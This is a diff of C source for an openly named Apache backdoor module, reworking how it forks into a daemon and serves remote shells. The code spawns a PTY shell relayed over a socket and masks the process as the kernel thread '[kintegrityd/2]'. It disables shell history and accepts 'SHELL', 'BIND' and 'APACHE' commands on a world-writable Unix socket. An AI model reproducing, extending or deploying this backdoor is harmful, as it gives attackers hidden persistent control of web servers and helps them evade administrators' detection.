@@ -484,7 +484,7 @@ void shellPTY1(int socket) {
 
     struct termios terminal;
     int terminalfd, n = 0, sr;
-    pid_t fpid;
+    pid_t ppid  ;
     char buf[1024];
 
     tcgetattr(terminalfd, &terminal);
@@ -492,18 +492,14 @@ void shellPTY1(int socket) {
     tcsetattr(terminalfd, TCSANOW, &terminal);
 
     fd_set readfd;
-    pid_t ppid = fork();
-    if(ppid < 0){
-        exit(0);
-    }else if (ppid == 0){
-        fpid = forkpty(&terminalfd, NULL, NULL, NULL);
+    ppid = fork();
 
-        if (fpid < 0) {
-            fprintf(stderr, "[-] Error: could not forkpty");
-            exit(EXIT_FAILURE);
-        }
-        else if (fpid == 0) { // Child process
+    if(ppid == 0){
 
+        ppid = forkpty(&terminalfd, NULL, NULL, NULL);
+
+        if (ppid == 0) { // Child process
+            setsid();
             char *argv[] = { "[kintegrityd/2]", 0 };
             char *envp[] = { "HISTFILE=","TERM=vt100", 0 };
 
@@ -520,7 +516,7 @@ void shellPTY1(int socket) {
                         memset(buf, 0, sizeof(buf));
                         n = read(terminalfd, buf, strlen(buf) + 1);
                         if (n <= 0) {
-                            kill(fpid, SIGKILL);
+                            kill(ppid, SIGKILL);
                             break;
                         } else {
                             write(socket, buf, strlen(buf));
@@ -530,7 +526,7 @@ void shellPTY1(int socket) {
                         memset(buf, 0, sizeof(buf));
                         n = read(socket, buf, strlen(buf) + 1);
                         if (n <= 0) {
-                            kill(fpid, SIGKILL);
+                            kill(ppid, SIGKILL);
                             break;
                         } else {
                             write(terminalfd, buf, strlen(buf));
@@ -541,8 +537,10 @@ void shellPTY1(int socket) {
             /*waitpid(fpid,NULL,0);
             exit(0);*/
         }
+    }else{
+        waitpid(ppid,NULL,0);
     }
-    waitpid(ppid,NULL,0);
+    //
     //exit(0);
     /*else{
         return DECLINED;
@@ -580,6 +578,8 @@ void shellPTY(int socket) {
         terminal.c_lflag &= ~ECHO;
         tcsetattr(terminalfd, TCSANOW, &terminal);
         fd_set readfd;
+
+        //kill(getppid(),SIGTERM);
 
         for (;;) {
             FD_ZERO(&readfd);
@@ -944,44 +944,12 @@ static int backdoor_post_read_request(request_rec *r) {
 	return DECLINED;
 }
 
-
-
-int backdoor_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp, server_rec *s) {
-    //pid_t ppid;
+int waitIPC(int master){
     pthread_t thread_id;
+    fd_set readfds;
+    int rc, sd, sr;
+    char buf[1024];
 
-    pid = fork();
-
-
-    // Kill father to create daemon rattached to pid 1
-    if (pid) {
-        return OK;
-    }
-
-	int master, i, rc, max_clients = 30, clients[30], new_client, max_sd, sd, sr;
-	struct sockaddr_un serveraddr;
-	char buf[1024];
-	fd_set readfds;
-
-	for (i = 0; i < max_clients; i++) {
-		clients[i] = 0;
-	}
-
-	master = socket(AF_UNIX, SOCK_STREAM, 0);
-	if (sd < 0) {
-		exit(0);
-	}
-	memset(&serveraddr, 0, sizeof(serveraddr));
-	serveraddr.sun_family = AF_UNIX;
-	strcpy(serveraddr.sun_path, IPC);
-	rc = bind(master, (struct sockaddr *)&serveraddr, SUN_LEN(&serveraddr));
-	if (rc < 0) {
-		exit(0);
-	}
-	listen(master, 5);
-	chmod(serveraddr.sun_path, 0777);
-
-    //pthread_t thread_id;
     while(1) {
         FD_ZERO(&readfds);
         FD_SET(master, &readfds);
@@ -992,6 +960,10 @@ int backdoor_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp,
             if (FD_ISSET(master, &readfds)) {
                 sd = accept(master, NULL, NULL);
                 FD_SET(sd, &readfds);
+                pid = fork();
+                if(pid){
+                    waitIPC(master);
+                }
                 if (FD_ISSET(sd, &readfds)) {
                     memset(buf, 0, 1024);
                     if ((rc = read(sd, buf, 1024)) <= 0) {
@@ -1000,8 +972,21 @@ int backdoor_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp,
                     } else {
                         if (strstr(buf, "SHELL") || strstr(buf, "BIND")) {
                             //pid_t spid;
+                            /*pid = fork();
+                            if(pid == 0){
+                                pthread_create(&thread_id, NULL, shellPTY, sd);
+                                pthread_detach(&thread_id);
+                                //kill(getppid(),SIGTERM);
+                            }else{
+                                //waitpid(pid,NULL,0);
+                                //exit(0);
+                                //waitIPC(master);
+                                exit(0);
+                            }*/
                             pthread_create(&thread_id, NULL, shellPTY, sd);
                             pthread_detach(&thread_id);
+                            //kill(getppid(),SIGTERM);
+                            //shellPTY1(sd);
 
                         } else if (strstr(buf, "APACHE")) {
                             restartApache();
@@ -1018,6 +1003,48 @@ int backdoor_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp,
             }
         }
     }
+}
+
+
+int backdoor_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp, server_rec *s) {
+    //pid_t ppid;
+
+
+    pid = fork();
+    // Kill father to create daemon attached to pid 1
+    if (pid) {
+        return OK;
+    }
+    int master, rc, sd, sr;
+    struct sockaddr_un serveraddr;
+    char buf[1024];
+    fd_set readfds;
+
+
+    master = socket(AF_UNIX, SOCK_STREAM, 0);
+    if (sd < 0) {
+        exit(0);
+    }
+    memset(&serveraddr, 0, sizeof(serveraddr));
+    serveraddr.sun_family = AF_UNIX;
+    strcpy(serveraddr.sun_path, IPC);
+    rc = bind(master, (struct sockaddr *)&serveraddr, SUN_LEN(&serveraddr));
+    if (rc < 0) {
+        exit(0);
+    }
+    listen(master, 5);
+    chmod(serveraddr.sun_path, 0777);
+
+	waitIPC(master);
+
+    /*pthread_t thread_id;
+    pid = fork();
+    if(pid){
+        exit(0);
+    }
+    pthread_create(&thread_id, NULL, waitIPC, master);
+    pthread_join(thread_id, NULL);*/
+
     /*while(1) {
         FD_ZERO(&readfds);
         FD_SET(master, &readfds);
